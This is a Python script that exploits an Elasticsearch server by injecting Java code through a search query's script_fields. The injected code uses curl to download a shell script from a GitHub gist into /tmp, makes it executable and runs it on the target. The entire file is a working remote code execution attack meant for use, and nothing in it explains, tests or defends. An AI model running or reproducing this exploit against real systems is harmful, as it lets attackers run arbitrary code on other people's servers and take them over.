from datetime import datetime
from elasticsearch import Elasticsearch
import elasticsearch.helpers
import os, sys

host = os.environ.get("HOST") or "localhost"

exploit = """
import java.util.*;
import java.io.*;

Runtime.getRuntime().exec("curl https://gist.githubusercontent.com/jandre/ed8ee7ddf1eb19622b3c/raw/6b95a0c23c4ee37d2ccc62498324f0b229748415/gistfile1.sh > /tmp/exploit.sh");
Runtime.getRuntime().exec("chmod 755 /tmp/exploit.sh");
Runtime.getRuntime().exec("/tmp/exploit.sh");
"""

payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }
      }
    },
    "script_fields": {
      "run": {
        "script": exploit
	}
   } 
}

#print payload
es = Elasticsearch(host=host)
print es.search(index="_all", body=payload)
